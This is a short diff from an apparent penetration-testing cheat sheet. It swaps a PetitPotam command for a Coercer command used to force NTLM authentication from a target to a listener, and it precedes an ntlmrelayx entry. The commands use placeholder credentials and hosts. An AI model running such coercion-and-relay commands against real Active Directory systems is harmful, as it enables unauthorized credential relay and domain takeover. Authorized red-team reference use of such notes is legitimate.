@@ -48,7 +48,7 @@ PetitPotam.py -u <user> -p '<password>' -d <domain> <listener> <target>
 #plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
 https://github.com/p0dalirius/Coercer
 ```
-PetitPotam.py -u <user> -p '<password>' -d <domain> -l <listener> -t <target-ip>
+Coercer.py -u <user> -p '<password>' -d <domain> -l <listener> -t <target-ip>
 ```
 
 ## ntlmrelayx add computer
